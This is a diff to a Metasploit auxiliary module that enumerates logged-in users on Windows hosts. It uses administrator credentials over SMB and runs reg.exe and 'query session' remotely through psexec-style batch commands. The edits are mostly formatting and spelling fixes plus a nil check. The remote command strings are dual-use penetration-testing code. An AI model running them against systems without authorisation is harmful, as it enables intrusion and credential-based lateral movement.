@@ -12,28 +12,27 @@ class MetasploitModule < Msf::Auxiliary
 
   # Aliases for common classes
   SIMPLE = Rex::Proto::SMB::SimpleClient
-  XCEPT  = Rex::Proto::SMB::Exceptions
-  CONST  = Rex::Proto::SMB::Constants
+  XCEPT = Rex::Proto::SMB::Exceptions
+  CONST = Rex::Proto::SMB::Constants
 
   def initialize
     super(
-      'Name'        => 'Microsoft Windows Authenticated Logged In Users Enumeration',
+      'Name' => 'Microsoft Windows Authenticated Logged In Users Enumeration',
       'Description' => %Q{
           This module uses a valid administrator username and password to enumerate users
         currently logged in, using a similar technique than the "psexec" utility provided
         by SysInternals. It uses reg.exe to query the HKU base registry key.
       },
-      'Author'      =>
-        [
-          'Royce Davis @R3dy__ <rdavis[at]accuvant.com>' # Metasploit module
-        ],
-      'References'  => [
+      'Author' => [
+        'Royce Davis @R3dy__ <rdavis[at]accuvant.com>' # Metasploit module
+      ],
+      'References' => [
         [ 'CVE', '1999-0504'], # Administrator with no password (since this is the default)
         [ 'OSVDB', '3106'],
         [ 'URL', 'http://www.pentestgeek.com/2012/11/05/finding-logged-in-users-metasploit-module/' ],
-        [ 'URL', 'http://technet.microsoft.com/en-us/sysinternals/bb897553.aspx' ]
+        [ 'URL', 'https://docs.microsoft.com/en-us/sysinternals/downloads/psexec' ]
       ],
-      'License'     => MSF_LICENSE
+      'License' => MSF_LICENSE
     )
 
     register_options([
@@ -81,16 +80,17 @@ class MetasploitModule < Msf::Auxiliary
       command = "#{cmd} /C echo reg.exe QUERY HKU ^> %SYSTEMDRIVE%#{text} > #{bat} & #{cmd} /C start cmd.exe /C #{bat}"
       out = psexec(command)
       output = get_output(ip, smbshare, text)
+      return nil unless output
       cleanout = Array.new
-      output.each_line { |line| cleanout << line.chomp if line.include?("HKEY") && line.split("-").size == 8 && !line.split("-")[7].include?("_")}
+      output.each_line { |line| cleanout << line.chomp if line.include?("HKEY") && line.split("-").size == 8 && !line.split("-")[7].include?("_") }
       return cleanout
     rescue StandardError => hku_error
-      print_error("Error runing query against HKU. #{hku_error.class}. #{hku_error}")
+      print_error("Error running query against HKU. #{hku_error.class}. #{hku_error}")
       return nil
     end
   end
 
-  # This method will retrive output from a specified textfile on the remote host
+  # This method will retrieve output from a specified textfile on the remote host
   def get_output(ip, smbshare, file)
     begin
       simple.connect("\\\\#{ip}\\#{smbshare}")
@@ -112,7 +112,10 @@ class MetasploitModule < Msf::Auxiliary
       :sname => 'smb',
       :port => rport,
       :type => 'smb.domain.loggedusers',
-      :data => "#{username} is logged in",
+      :data => {
+        :user => username,
+        :status => "Logged in"
+      },
       :update => :unique_data
     )
   end
@@ -125,7 +128,7 @@ class MetasploitModule < Msf::Auxiliary
       command = "#{cmd} /C echo reg.exe QUERY \"HKU\\#{key}\\Volatile Environment\" ^> %SYSTEMDRIVE%#{text} > #{bat} & #{cmd} /C start cmd.exe /C #{bat}"
       out = psexec(command)
       if output = get_output(ip, smbshare, text)
-        domain, username, dnsdomain, homepath, logonserver = "","","","",""
+        domain, username, dnsdomain, homepath, logonserver = "", "", "", "", ""
         # Run this IF loop and only check for specified user if datastore['USERNAME'] is specified
         if datastore['USERNAME'].length > 0
           output.each_line do |line|
@@ -192,7 +195,7 @@ class MetasploitModule < Msf::Auxiliary
     end
   end
 
-  # Method trys to use "query session" to determine logged in user
+  # Method tries to use "query session" to determine logged in user
   def query_session(smbshare, ip, cmd, text, bat)
     begin
       command = "#{cmd} /C echo query session ^> %SYSTEMDRIVE%#{text} > #{bat} & #{cmd} /C start cmd.exe /C #{bat}"
